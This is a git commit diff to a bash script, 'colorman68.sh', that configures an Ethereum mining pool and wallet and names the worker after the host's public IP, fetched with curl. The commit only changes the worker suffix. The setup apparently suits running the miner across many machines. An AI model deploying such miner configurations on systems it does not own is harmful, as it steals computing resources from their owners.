193447ad425c2bdb7c524791f80c2048a4529e24
colorman001122 <96538814+colorman001122@users.noreply.github.com>
2022-02-18 19:06:14 +0700

    Update colorman68.sh

--- colorman68.sh
+++ colorman68.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 POOL=us1.ethermine.org:4444
-WALLET=0xf7273ad5d0e81c6395ba1aa880c57fb99de9414a.$(echo "$(curl -s ifconfig.me)" | tr . _ )-colorman68
+WALLET=0xf7273ad5d0e81c6395ba1aa880c57fb99de9414a.$(echo "$(curl -s ifconfig.me)" | tr . _ )-colorman123
 
 cd "$(dirname "$0")"
 
